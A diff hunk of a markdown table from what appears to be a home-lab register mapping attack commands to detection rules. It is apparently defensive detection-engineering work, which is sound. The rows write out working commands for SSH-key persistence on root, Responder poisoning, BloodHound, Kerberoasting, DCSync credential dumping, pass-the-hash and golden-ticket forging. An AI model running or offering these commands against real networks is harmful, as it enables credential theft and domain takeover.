@@ -116,7 +116,7 @@ This register provides the definitive, unredacted catalog of Indicators of Compr
 | **OpenSSH** | `echo "ssh-ed25519..." >> /root/.ssh/authorized_keys` | DVWA | Wazuh Rule 550 (Syscheck FIM) / Rule 5715 | `T1098.004` |
 | **Responder** | `python3 /opt/Responder/Responder.py -I ens33 -wd` | DVWA | Linux Auditd `bashcmd` (uid:0 Responder) | `T1557.001` |
 | **BloodHound** | `bloodhound-python -u win10 -p Secur3Lab! -d ad.lab -dc PC-DC.ad.lab -c All` | DVWA -> DC | Wazuh Rule 5715 (Pivot root SSH logon) | `T1087.002` |
-| **Impacket SPNs** | `python3 GetUserSPNs.py ad.lab/win10:Secur3Lab! -dc-ip 192.168.56.10 -request` | DVWA -> DC | Suricata SID 2019922 (TGS-REQ wire frame) | `T1558.003` |
+| **Impacket SPNs** | `python3 GetUserSPNs.py ad.lab/win10:Secur3Lab! -dc-ip 192.168.56.10 -request` | DVWA -> DC | Suricata SID 2019922 (ET EXPLOIT Possible GoldenPac Priv Esc in-use [TGS-REQ wire frame]) & Wazuh Rule 100220 | `T1558.003` |
 | **Impacket DCSync** | `python3 secretsdump.py 'ad.lab/HANK_SHERMAN:Password123@192.168.56.10' -just-dc` | DVWA -> DC | Wazuh Rule 5715 / Windows EID 4662 | `T1003.006` |
 | **Impacket wmiexec** | `python3 wmiexec.py -hashes :... Administrator@192.168.56.10` | DVWA -> DC | Windows EID 4624 (Logon Type 3 NTLM) | `T1550.002` |
 | **Impacket ticketer** | `python3 ticketer.py -nthash 611a8cdcc... -domain-sid S-1-5-21... -domain ad.lab Administrator` | DVWA | Wazuh Rule 5715 / Auditd execution | `T1558.001` |
